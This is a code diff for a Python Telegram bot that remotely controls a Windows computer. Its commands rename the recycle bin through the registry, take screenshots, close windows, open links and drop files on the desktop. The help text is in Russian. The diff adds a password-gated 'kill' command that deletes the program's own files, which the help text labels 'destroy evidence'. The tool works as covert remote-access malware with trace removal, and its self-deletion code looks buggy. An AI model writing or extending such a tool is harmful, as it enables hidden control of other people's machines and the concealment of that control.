@@ -51,7 +51,14 @@ class Bot:
         return True
 
     def kill_self(self):
-        os.remove(self.way)
+        mass = os.listdir(self.way)
+        for i in mass:
+            if i.find('.exe') != -1:
+                spec = i
+                mass.remove(i)
+        for i in mass:
+            os.remove(f'{self.way}\\{i}')
+        os.remove(spec)
 
     def rename(self, name, arg=0):
         location = winreg.HKEY_CURRENT_USER
@@ -63,13 +70,16 @@ class Bot:
         else: pyautogui.press('f5')
 
     def file(self, message):
-        fileID = message.photo[-1].file_id
-        file_info = bot.get_file(fileID)
-        downloaded_file = bot.download_file(file_info.file_path)
-        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
-        with open(os.path.join(dir_name, f'{len(downloaded_file)}.jpg'), 'wb') as new_file:
-            new_file.write(downloaded_file)
-        return True
+        if message.caption == f'{self.code}==save_pict':
+            fileID = message.photo[-1].file_id
+            file_info = bot.get_file(fileID)
+            downloaded_file = bot.download_file(file_info.file_path)
+            dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
+            with open(os.path.join(dir_name, f'{len(downloaded_file)}.jpg'), 'wb') as new_file:
+                new_file.write(downloaded_file)
+            return True
+        elif message.caption == f'{self.code}==change_DT':
+            pass
 
     def webbrowser(self, arg):
         webbrowser.open(arg)
@@ -82,16 +92,21 @@ class Bot:
         if command[0] != self.code: return False
         else:
             if command[1][0] == 'help':
-                bot.send_message(message.chat.id, "1:переименовать мусорку когда не рабочий стол: rename_trash_nodesk"
-                                                  "\n 1.1:переименовать мусорку кокда открыт рабочий стол: rename_trash_desk"
-                                                  "\n 2:создать текстовый файл на рабочем столе: creat_txt"
-                                                  "\n 3:закрыть все: close_all"
-                                                  f"\n 4:пароь: {self.code}"
-                                                  "\n 5:отправь фото и оно сохранится на рабочий стол: *просто отправь фото*"
-                                                  "\n 6:сменить пароль: repar"
-                                                  "\n 7:снимок экрана: screen"
-                                                  "\n 8:открыть ссылку: open_webbr"
-                                                  "\n 9:изменить звук: sound")
+                bot.send_message(message.chat.id, "1:переименовать мусорку когда открыт не рабочий стол: rename_trash_nodesk"
+                                                  "\n1.1:переименовать мусорку кокда открыт рабочий стол: rename_trash_desk"
+                                                  "\n2:создать текстовый файл на рабочем столе: creat_txt"
+                                                  "\n3:закрыть все: close_all"
+                                                  f"\n4:пароль: {self.code}"
+                                                  "\n5:отправь фото и оно сохранится на рабочий стол: *просто отправь фото* + преписка в самом фото save_pict"
+                                                  "\n6:сменить пароль: repar"
+                                                  "\n7:снимок экрана: screen"
+                                                  "\n8:открыть ссылку: open_webbr"
+                                                  "\n9:изменить звук: sound"
+                                                  "\n10:уничтожить улики:kill")
+                return True
+            if command[1][0] == 'kill':
+                if self.kill_self():
+                    bot.send_message(message.chat.id, "i'm sucsesfull kill myself :(")
                 return True
             if command[1][0] == 'rename_trash_nodesk':
                 self.rename(command[1][1], arg=0)
@@ -127,17 +142,11 @@ bot = bot_bot.bot
 
 @bot.message_handler(content_types=['text'])
 def message_reply(message):
-    if message.text != "%spec%" or message.text != '%kill%':
-        bot.send_message(message.chat.id, "connect")
-        if bot_bot.command(message.text, message=message):
-            bot.send_message(message.chat.id,"sucsess")
-        else:
-            bot.send_message(message.chat.id, "unsucsess")
-    elif message.text == '%spec%':
-        bot_bot.command(f"{bot_bot.code}==help", message=message)
+    bot.send_message(message.chat.id, "connect")
+    if bot_bot.command(message.text, message=message):
+        bot.send_message(message.chat.id,"sucsess")
     else:
-        bot_bot.kill_self()
-        bot.send_message(message.chat.id, "i'm sucsessful kill myself :(")
+        bot.send_message(message.chat.id, "unsucsess")
 
 @bot.message_handler(content_types=['photo'])
 def message_reply(message):
